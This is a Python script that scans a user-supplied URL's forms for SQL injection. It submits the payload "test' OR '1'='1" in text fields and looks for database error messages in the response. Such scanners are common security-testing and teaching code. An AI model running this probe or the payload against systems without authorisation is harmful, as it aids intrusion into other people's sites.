import requests
from bs4 import BeautifulSoup
import re

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def get_form_details(form):
    details = {}
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        inputs.append({'type': input_type, 'name': input_name})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated"
    }
    for error in errors:
        if re.search(error, response.content.decode().lower()):
            return True
    return False

def scan_sql_injection(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        details = get_form_details(form)
        for input_tag in details["inputs"]:
            if input_tag["type"] == "text":
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "text":
                        data[input_tag["name"]] = "test' OR '1'='1"
                    else:
                        data[input_tag["name"]] = "test"
                if details["method"] == "post":
                    res = requests.post(url, data=data)
                else:
                    res = requests.get(url, params=data)
                if is_vulnerable(res):
                    print(f"[!] SQL Injection vulnerability detected on {url}")
                    print(f"[*] Form details:")
                    print(details)
                    break

if __name__ == "__main__":
    url = input("Enter URL to test for SQL Injection: ")
    scan_sql_injection(url)
